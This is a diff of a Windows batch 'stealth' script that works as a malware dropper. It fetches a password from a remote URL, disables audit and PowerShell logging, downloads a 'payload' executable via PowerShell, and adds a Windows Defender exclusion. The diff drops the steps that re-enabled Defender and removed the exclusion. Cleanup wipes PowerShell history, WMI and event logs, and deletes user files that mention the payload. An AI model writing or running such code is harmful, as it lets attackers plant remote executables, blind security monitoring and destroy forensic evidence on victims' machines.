@@ -41,10 +41,6 @@ goto LOGIN
 
 :CheckStealthPassword
 set "inputpass=%~1"
-:: NOTE: This method relies on 'powershell.exe' being in the system's PATH.
-:: If you encounter 'C:\Program' errors or PowerShell not found issues,
-:: consider replacing this with the method discussed previously that uses %PWSH%
-:: and SetEnvironmentVariable for robustness.
 for /f "usebackq delims=" %%A in (`powershell -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
 if /i "%inputpass%"=="%remote_pass%" (
     exit /b 0
@@ -195,38 +191,46 @@ exit /b
 
 :: --- SETUP Option ---
 :SETUP
+echo DEBUG: Entering SETUP section.
+pause
+
 :: 1. Disable Audit Logs and PowerShell Logging
 call :DisableAuditLogs
 call :DisablePowerShellLogging
 
-:: 2. Disable Windows Defender Real-time Monitoring
-echo [*] Disabling Windows Defender Real-time Monitoring...
-"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
+echo DEBUG: Audit logs and PowerShell logging disabled.
+pause
 
-:: 3. Disable Data Usage Service (dmwappushservice) - Moved from RUN
+:: 2. Disable Data Usage Service (dmwappushservice) - Moved from RUN
 echo [*] Disabling Data Usage Service (dmwappushservice)...
 sc stop dmwappushservice >nul 2>&1
 sc config dmwappushservice start= disabled >nul 2>&1
+
+echo DEBUG: Data Usage Service disable command executed.
+pause
 
 echo [*] STEP 1: Preparing download...
 timeout /t 1 /nobreak >nul
 echo [*] STEP 2: Connecting to GitHub...
 timeout /t 1 /nobreak >nul
+
+echo DEBUG: About to execute PowerShell download command. PWSH path: "%PWSH%"
+pause
+
 echo [*] STEP 3: Downloading payload (CAXVN.exe)...
-:: --- DEBUGGING START ---
 :: Redirect PowerShell's output (including errors) to a temporary log file.
 :: This will allow us to inspect what PowerShell is doing even if the batch file closes.
 "%PWSH%" -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')" > "%temp%\powershell_download_debug.log" 2>&1
-echo DEBUG: PowerShell download command executed. Check "%temp%\powershell_download_debug.log" for details.
+
+echo DEBUG: PowerShell download command has completed. Checking for log file.
 pause
-:: --- DEBUGGING END ---
 
 if exist "%SETUP_EXE%" (
     echo [+] Download successful.
+    echo DEBUG: %SETUP_EXE% exists. Proceeding with success path.
+    pause
     call :AddDefenderExclusion
-    :: Re-enable Defender, Audit Logs, and Data Usage Service on success
-    echo [*] Re-enabling Windows Defender Real-time Monitoring...
-    "%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+    :: Re-enable Data Usage Service, Audit Logs, and PowerShell Logging on success
     echo [*] Re-enabling Data Usage Service (dmwappushservice)...
     sc config dmwappushservice start= auto >nul 2>&1
     sc start dmwappushservice >nul 2>&1
@@ -234,10 +238,9 @@ if exist "%SETUP_EXE%" (
     call :EnablePowerShellLogging
 ) else (
     echo [!] ERROR: Failed to download EXE.
+    echo DEBUG: %SETUP_EXE% does NOT exist. Proceeding with failure path.
     pause
-    :: Re-enable Defender, Audit Logs, and Data Usage Service on failure
-    echo [*] Re-enabling Windows Defender Real-time Monitoring (due to failure)...
-    "%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+    :: Re-enable Data Usage Service, Audit Logs, and PowerShell Logging on failure
     echo [*] Re-enabling Data Usage Service (due to failure)...
     sc config dmwappushservice start= auto >nul 2>&1
     sc start dmwappushservice >nul 2>&1
@@ -246,6 +249,7 @@ if exist "%SETUP_EXE%" (
     goto STEALTH_MENU
 )
 
+echo DEBUG: Exiting SETUP section, going to STEALTH_MENU.
 pause
 goto STEALTH_MENU
 
@@ -302,9 +306,8 @@ if %errorlevel% neq 1060 ( :: 1060 means service does not exist
 call :EnableAuditLogs
 call :EnablePowerShellLogging
 
-:: Re-enable Windows Defender Real-time Monitoring
-echo [*] Re-enabling Windows Defender Real-time Monitoring...
-"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+:: Windows Defender Real-time Monitoring re-enable option removed as per request.
+:: Only exclusion is managed now.
 
 echo [*] Running cleanup...
 
@@ -329,8 +332,8 @@ ipconfig /flushdns >nul
 :: Clear clipboard
 echo off | clip
 
-:: Remove Defender exclusion
-call :RemoveDefenderExclusion
+:: Remove Defender exclusion - REMOVED AS PER REQUEST
+:: call :RemoveDefenderExclusion
 
 :: Clear WMI Repository logs (Good practice for stealth)
 echo [*] Clearing WMI Repository logs...
@@ -381,8 +384,8 @@ exit
 echo [*] Cleaning PowerShell history and related logs...
 del /f /q "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1
 for /r "%userprofile%" %%F in (*.txt *.log *.ps1) do (
-    findstr /i "CAXVN.exe" "%%F" >nul 2>&1 && del "%%F" >nul 2>&1
-    findstr /i "%~nx0" "%%F" >nul 2>&1 && del "%%F" >nul 2>&1
+    findstr /i "CAXVN.exe" >nul 2>&1 "%%F" && del "%%F" >nul 2>&1
+    findstr /i "%~nx0" >nul 2>&1 "%%F" && del "%%F" >nul 2>&1
 )
 wevtutil cl "Microsoft-Windows-PowerShell/Operational" >nul 2>&1
 exit /b 0
